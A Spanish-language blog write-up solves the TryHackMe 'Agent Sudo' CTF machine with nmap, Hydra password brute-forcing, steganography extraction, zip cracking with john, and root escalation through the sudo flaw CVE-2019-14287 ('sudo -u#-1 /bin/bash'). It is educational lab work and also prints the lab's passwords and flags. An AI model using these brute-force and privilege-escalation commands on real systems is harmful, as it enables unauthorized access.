---
layout: post
title: Tryhackme - Agent Sudo
autor: S3cureroy
date: 2023-04-21
categories: [CTF, Tryhackme]
tags: [ftp,sudo,brute force,hydra,ssh,esteganografía, binwalk,steghide,CVE-2019-14287]
---

En esta ocasión traigo la resolución de una máquina que contiene cosas nuevas a las anteriormente vistas en el blog. Entre ellas, destaca que es una máquina que tiene varias técnicas de esteganografía, y la escalada de privilegios hace uso de una vulnerabilidad conocida de sudo bastante curiosa.

Además, la estética de agentes secretos y publicaciones de aliens, hace que la máquina tenga una ambientación de película de espías que engancha.

Espero que la disfrutéis.

## Enumeración.

Como siempre se comienza en este tipo de máquinas, se lanza un comando ```nmap``` para hacer un descubrimiento de puertos.

En este caso, se puede observar que la máquina expone los puertos 21, 22 y 80, asociados a los servicios FTP, SSH y HTTP respectivamente.

```shell
Nmap scan report for 10.10.137.161
Host is up (0.079s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.91 seconds
```


### WEB.

Se accede al puerto 80 mediante un navegador WEB, encontrando el siguiente mensaje que hace ver que los usuarios usan una letra como su ¨*codename*¨

![Agentsudo1][Agentsudo1]

Al cambiar el user-agent a la letra C, se hace una redirección de la petición al recurso *agent_C_attention.php*. En dicha página informan al usuario **chris** que su contraseña es vulnerable.  

![Agentsudo2][Agentsudo2]


### FTP.

Al conocer un usuario (chris) que podría tener una contraseña sencilla, se intenta, mediante la aplicación hydra, acceder al servicio FTP. Hydra informa que la contraseña es "**crystal**", encontrada en el diccionario rockyou.

```shell
hydra -l chris -P s3cureroy/DICCIONARIOS/rockyou.txt 10.10.67.66 ftp                                                                                                                                                                    
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-25 13:29:26
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking ftp://10.10.67.66:21/
[21][ftp] host: 10.10.67.66   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-25 13:30:33
```


Se accede entonces mediante el protocolo FTP, y una vez dentro del servidor se listan 3 ficheros (1 fichero de texto y 2 imágenes), que se obtienen mediante el comando ```get``` de FTP.

#### Ficheros obtenidos.

El contenido del fichero de texto es el siguiente:

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

El texto hace sospechar que las imágenes pueden contener algún fichero escondido, lo que se conoce como esteganografía. 

Haciendo uso de la herramienta ```binwalw```, se verifica que dentro de la imagen llamada **cutie.png** (La otra solicita una contraseña y se dejará para más adelante) está escondida una nota en formato texto (To_agentR.txt) dentro de un fichero comprimido con extensión zip.

```shell
binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

Al intentar acceder al fichero comprimido, éste solicita una contraseña que no se tiene, por tanto, se utiliza la herramienta ```john the ripper``` para intentar obtenerla mediante un diccionario.

El resultado es la palabra **alien**.

```shell
zip2john ~/CTF/_cutie.png.extracted/8702.zip > ~/CTF/_cutie.png.extracted/zip.txt
```

```shell
john --wordlist=~/s3cureroy/DICCIONARIOS/rockyou.txt zip.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:01 DONE (2021-03-25 15:40) 0.7812g/s 19200p/s 19200c/s 19200C/s troyboy..280890
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Con la contraseña, se accede al fichero zip y descomprime el fichero **To_agentR.txt**, que tiene el siguiente contenido:

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

La cadena de texto QXJlYTUx hace pensar que está encondeada con alguna base mayor a 10 o que se usa un algoritmo de rotado, etc. 

Se accede a [cyberchef](https://cyberchef.org/) y se identifica la base usada para encodear el texto como Base64, dando como resultado la palabra **Area51**.

![Agentsudo3][Agentsudo3]

Como se vio anteriormente, la otra imagen llamada **cute-alien.png** pedía una contraseña para poder acceder a los ficheros que tenía escondidos. Se utiliza la herramienta ```steghide``` para acceder a ellos, obteniendo el fichero **message.txt**

```shell
sudo steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".

```

El fichero **message.txt** tiene el siguiente contenido:

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
## Acceso inicial.

Con la contraseña del usuario se accede mediante el protocolo SSH con el usuario "**james**" y la contraseña "**hackerrules!**".

Dentro del directorio home del usuario se obtiene la primera *flag* (b03d975e8c92a7c04146cfa7a5a313c7).

Dentro del directorio también existe una imagen llamada **Alien_autopsy.jpg** que al examinar mediante la herramienta ```strings```, se ve que tiene cabeceras que no corresponden aparentemente a una imagen, como dice su extensión de fichero.

```shell
Exif
Ducky
-http://ns.adobe.com/xap/1.0/
<?xpacket begin="
" id="W5M0MpCehiHzreSzNTczkc9d"?> <x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.0-c061 64.140949, 2010/12/07-10:57:01        "> <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"> <rdf:Description rdf:abou
t="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/" xmlns:stRef="http://ns.adobe.com/xap/1.0/sType/ResourceRef#" xmp:CreatorTool="Adobe Photoshop CS5.1 Macintosh" xmpMM:InstanceID="xmp.iid:9C9392
2F8AE411E9BC49D707FF8214D7" xmpMM:DocumentID="xmp.did:9C9392308AE411E9BC49D707FF8214D7"> <xmpMM:DerivedFrom stRef:instanceID="xmp.iid:9630A2E68ADA11E9BC49D707FF8214D7" stRef:documentID="xmp.did:9C93922E8AE411E9BC49D707FF8214D7"/> </rdf
:Description> </rdf:RDF> </x:xmpmeta> <?xpacket end="r"?>
Adobe
Q"a2
```

Se examina con la herramienta ```exiftool```, mostrando el siguiente resultado.

```
ExifTool Version Number         : 12.16
File Name                       : Alien_autospy.jpg
Directory                       : .
File Size                       : 41 KiB
File Modification Date/Time     : 2021:03:26 03:08:47-04:00
File Access Date/Time           : 2021:03:26 03:09:08-04:00
File Inode Change Date/Time     : 2021:03:26 03:08:47-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Quality                         : 75%
XMP Toolkit                     : Adobe XMP Core 5.0-c061 64.140949, 2010/12/07-10:57:01
Creator Tool                    : Adobe Photoshop CS5.1 Macintosh
Instance ID                     : xmp.iid:9C93922F8AE411E9BC49D707FF8214D7
Document ID                     : xmp.did:9C9392308AE411E9BC49D707FF8214D7
Derived From Instance ID        : xmp.iid:9630A2E68ADA11E9BC49D707FF8214D7
Derived From Document ID        : xmp.did:9C93922E8AE411E9BC49D707FF8214D7
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1000
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1000x300
Megapixels                      : 0.300
```

Después de hacer varios intentos para obtener más información de la imagen, se descarta y se intentan otras operativas para escalar privilegios.

## Escalada de privilegios.

Se comienza lanzando el comando ```sudo -l``` para ver que permisos tiene el usuario sobre el comando sudo.

```sql
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

Al buscar la cadena "**(ALL, !root) /bin/bash**" en Internet, se encuentra un enlace a [exploitdb](https://www.exploit-db.com/exploits/47502) en el que informa que es una mala implementación, y que se puede lanzar el comando sudo con cualquier usuario, menos con el propio root.

Sudo, en esta versión no hace un *checkeo* de la existencia de los user id y ejecuta el comando con un id arbitrario, se puede ver ejecutando el comando con un UID inventado (CVE-2019-14287).

```shell
james@agent-sudo:~$ sudo -u#-2 /bin/bash
I have no name!@agent-sudo:~$ id
uid=4294967294 gid=1000(james) groups=1000(james)
```

Entonces, lanzando el comando con el UID -1 se puede ver que realmente, se ejecuta con el UID 0 que es el perteneciente al usuario root.

```shell 
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
```

Solamente queda recoger la flag de root para terminar de vulnerar la máquina.

```
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

Y hasta aquí la resolución de la máquina más alienígena desde la de [Rick y Morty](https://s3cureroy.github.io/posts/thm-writeup-picklericky/). Espero que os haya gustado, y recordad las redes sociales si queréis contactar conmigo.

Salu2!!!

[Agentsudo1]: https://i.imgur.com/S4euCsd.png
[Agentsudo2]: https://i.imgur.com/purbL9m.png
[Agentsudo3]: https://i.imgur.com/XvI3hAz.png